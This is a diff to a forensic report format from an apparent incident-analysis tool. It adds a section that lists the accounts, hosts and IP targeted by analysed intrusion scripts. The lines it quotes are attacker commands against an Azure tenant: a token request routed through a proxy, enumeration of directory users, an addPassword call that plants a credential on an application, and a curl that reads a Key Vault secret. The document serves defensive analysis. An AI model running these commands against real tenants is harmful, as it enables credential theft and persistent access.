@@ -7,6 +7,7 @@ Summary
   indicators  32  6 Domain, 2 Email, 1 EntraLoginEndpoint, 4 GUID, 11 GraphEndpoint, 2 IPv4, 3 KeyVaultEndpoint, 1 OAuthScope, 2 URL
   activities  12
   tactics     6
+  targeted    8   Usernames 1, Email addresses 2, Hostnames 4, IP addresses 1
   exposed     7   Usernames 3, Email addresses 2, IP addresses 2
   intel hits  0
 
@@ -140,6 +141,34 @@ Notable files   (a finding of high severity)
       linked  vaults_20261015_093010.txt, secrets_20261015_093030.txt
   [x] output  agent_20261015_093500.jsonl
       found   AppRoleAssignment, KeyVaultSecretRead
+
+Targeted   (hardcoded in a script; prior: no earlier output holds it; discovered: an earlier output does)
+  Usernames (1)
+    [!] 66666666-7777-4888-9999-000000000000  prior  20261015_090000_step01_token.sh:8
+        what  az login --service-principal -u "$APP" -p "$SECRET" --tenant "$TENANT" (20261015_090000_step01_token.sh:8)
+  Email addresses (2)
+    [i] alice@corp.example  discovered  20261015_092000_step04_collect.py:7
+        from  directory_20261015_090530.txt:1
+        what  for user in ["alice@corp.example", "bob@corp.example"]: (20261015_092000_step04_collect.py:7)
+    [i] bob@corp.example    discovered  20261015_092000_step04_collect.py:7
+        from  directory_20261015_090530.txt:1
+        what  for user in ["alice@corp.example", "bob@corp.example"]: (20261015_092000_step04_collect.py:7)
+  Hostnames (4)
+    [!] corpvault.vault.azure.net  prior       20261015_093000_step05_vault.sh:7
+        what  curl -s -H "Authorization: Bearer $KV" "https://corpvault.vault.azure.net/secrets/db-password?api-version=7.4" >> secrets_20261015_093030.txt (20261015_093000_step05_vault.sh:7)
+    [!] graph.microsoft.com        prior       20261015_090000_step01_token.sh:5, 20261015_090500_step02_recon.ps1:2, 20261015_091000_step03_escalate.ps1:3 and 1 more
+        what  curl -s -x http://144.172.64.128:8080 -d "client_id=$APP" -d "scope=https://graph.microsoft.com/.default" \ (20261015_090000_step01_token.sh:5)
+              Invoke-RestMethod -Headers $h -Uri "https://graph.microsoft.com/v1.0/users?`$top=999" | ConvertTo-Json | Out-File directory_20261015_090530.txt (20261015_090500_step02_recon.ps1:2)
+              Invoke-RestMethod -Method Post -Headers $h -Uri "https://graph.microsoft.com/v1.0/applications/66666666-7777-4888-9999-000000000000/addPassword" -Body '{}' (20261015_091000_step03_escalate.ps1:3)
+              and 1 more in the saved report
+    [!] login.microsoftonline.com  prior       20261015_090000_step01_token.sh:7
+        what  "\"https://login.microsoftonline.com/$TENANT/oauth2/v2.0/token\" > token_20261015_090010.json (20261015_090000_step01_token.sh:7)"
+    [i] corp.example               discovered  20261015_092000_step04_collect.py:7
+        from  directory_20261015_090530.txt:1
+        what  for user in ["alice@corp.example", "bob@corp.example"]: (20261015_092000_step04_collect.py:7)
+  IP addresses (1)
+    [!] 144.172.64.128  public  prior  20261015_090000_step01_token.sh:5
+        what  curl -s -x http://144.172.64.128:8080 -d "client_id=$APP" -d "scope=https://graph.microsoft.com/.default" \ (20261015_090000_step01_token.sh:5)
 
 Exposure   (collected: first seen in an output; used: first seen in a script; a secret is masked)
   Usernames (3)
@@ -325,5 +354,5 @@ Mitigation   (MITRE ATT&CK and ATLAS, for the techniques found)
       for  SharePointEnumeration: resource /sites, resource /sites/root/drives
 
 [x] HIGH - 7 impacts: 5 high, 1 medium, 1 low
--> saved to <out>: report.txt, files.json, trace.json, findings.json, exposure.json, report.json
+-> saved to <out>: report.txt, files.json, trace.json, findings.json, targeted.json, exposure.json, report.json
 -> one section: slopmop -inputdir <folder> report impact
